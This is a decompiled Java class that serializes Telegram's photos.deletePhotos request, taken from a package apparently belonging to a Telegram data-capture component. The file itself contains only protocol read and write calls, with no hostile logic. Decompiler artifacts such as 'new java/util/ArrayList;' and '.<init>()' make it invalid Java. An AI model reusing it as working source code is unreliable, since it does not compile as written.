package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_photos_deletePhotos
  extends TLObject
{
  public static int constructor = -2016444625;
  public ArrayList id;
  
  public TLRPC$TL_photos_deletePhotos()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.id = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    TLRPC.Vector localVector = new com/vvt/capture/telegram/internal/TLRPC$Vector;
    localVector.<init>();
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    int j = 0;
    while (j < i)
    {
      ArrayList localArrayList = localVector.objects;
      long l = paramAbstractSerializedData.readInt64(paramBoolean);
      Long localLong = Long.valueOf(l);
      localArrayList.add(localLong);
      j += 1;
    }
    return localVector;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.id.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    TLRPC.InputPhoto localInputPhoto = null;
    for (int k = 0; k < j; k = i)
    {
      localInputPhoto = (TLRPC.InputPhoto)this.id.get(k);
      localInputPhoto.serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_photos_deletePhotos.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */